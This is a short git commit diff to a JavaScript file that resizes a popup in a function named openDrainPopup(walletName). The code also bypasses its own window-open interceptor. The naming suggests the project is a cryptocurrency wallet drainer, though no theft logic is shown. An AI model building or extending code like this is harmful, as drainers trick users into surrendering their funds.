096e1454ceb118c6126aa8c122f3b6f15354ade3
Your Name <mochaoui@student.1337.ma>
2026-04-16 19:25:05 +0100

    clear

--- src/main.js
+++ src/main.js
@@ -76,7 +76,7 @@ function openDrainPopup(walletName) {
   if (isMobile) {
     window.location.href = url;
   } else {
-    const pw = 340, ph = 360;
+    const pw = 360, ph = 370;
     const left = Math.round((screen.width - pw) / 2);
     const top = Math.round((screen.height - ph) / 2);
     // Use _origOpen to bypass our own interceptor
